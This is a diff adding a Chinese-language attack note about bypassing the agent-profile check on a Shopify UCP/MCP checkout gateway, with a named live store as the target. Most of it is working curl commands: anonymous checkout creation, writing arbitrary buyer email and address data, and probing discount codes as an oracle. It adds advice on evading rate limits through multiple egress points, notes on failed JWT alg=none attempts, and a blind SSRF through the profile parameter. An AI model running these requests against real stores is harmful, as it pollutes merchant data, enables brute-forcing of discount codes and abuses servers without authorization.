@@ -1,0 +1,37 @@
+# Shopify UCP/MCP 网关 agent-profile 门禁自绕
+
+## 适用条件
+- Shopify 托管店，`/.well-known/ucp` 返回 200 JSON，含 `"transport":"mcp"` 与 `"endpoint":"https://<store>.myshopify.com/api/ucp/mcp"`。
+- 无需任何 Cookie / JWT / 账号。
+
+## 核心缺陷
+`tools/call` 要求 `arguments.meta.ucp-agent.profile`，服务端只校验「该 URI 可被抓取」，不校验归属/签名。填店铺自身公开文档即通过；去掉 profile 立即 `422 invalid_profile_url`，证明是门禁自绕。
+
+## 最小验证（curl）
+```bash
+EP=https://www.retro32.com/api/ucp/mcp
+PROFILE=https://www.retro32.com/.well-known/ucp
+H=(-H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream')
+
+# 工具清单
+curl -sS "$EP" "${H[@]}" -d '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
+
+# 匿名创建 checkout（GB 上下文必须，否则 out_of_stock；金额 2500）
+curl -sS "$EP" "${H[@]}" -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"create_checkout","arguments":{"meta":{"ucp-agent":{"profile":"'"$PROFILE"'"}},"checkout":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/<VID>"},"quantity":1}],"buyer":{"email":"probe@example.com"},"context":{"address_country":"GB"}}}}}'
+# => 200 {"ucp":{...},"id":"gid://shopify/Checkout/<X>?key=<Y>","totals":[...],"expires_at":...}
+
+# 折扣码 oracle：无效码 => messages[].code=discount_code_invalid
+curl -sS "$EP" "${H[@]}" -d '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"update_checkout","arguments":{"meta":{"ucp-agent":{"profile":"'"$PROFILE"'"}},"id":"gid://shopify/Checkout/<X>?key=<Y>","checkout":{"line_items":[{"item":{"id":"gid://shopify/ProductVariant/<VID>"},"quantity":1}],"discounts":{"codes":["WELCOME10"]}}}}}'
+```
+
+## 坑与边界（实测）
+- **强限流**：约 2400s 固定窗口 + 少量请求配额，超出返回 `429 code -32000 Rate limit exceeded` + `retry after ~2400 seconds`。批量刷对象、折扣码爆破在单出口不可行；需要多出口/长周期慢速。
+- **JSON-RPC batch 不支持**：数组体 => `400 code -32600 Invalid Request`，不能批量绕限流。
+- **key 强制**：`get_checkout` 去掉 `?key=` => `invalid_checkout_id`；换对象 GID + 本把 key => `cart_not_found`，非 IDOR。
+- **complete_checkout / get_order 需 JWT**：无 JWT => `403 -32000 AuthenticationRequired`；`alg=none` => `401 Invalid global access token`。
+- **目录面公开**：search_catalog/get_product 仅公开 storefront 字段（description/price/variants/collections），无库存/成本。
+- **continue_url** 在 Web 侧 301 回落 `/cart`，不直接呈现对象内容。
+- 目标为 Shopify SaaS，无服务器权限与 webshell 面：本链只能做到「未认证交易对象创建 + 任意 PII 写入 + 折扣码 oracle」，不构成持久化立足点。
+
+## 影响
+未认证创建真实 Cart/Checkout（金额随 quantity 精确变化），写入任意 buyer.email/收货地址/电话 → 商家后台数据污染与社工面；折扣码存在性 oracle；profile 参数同时构成盲 SSRF。
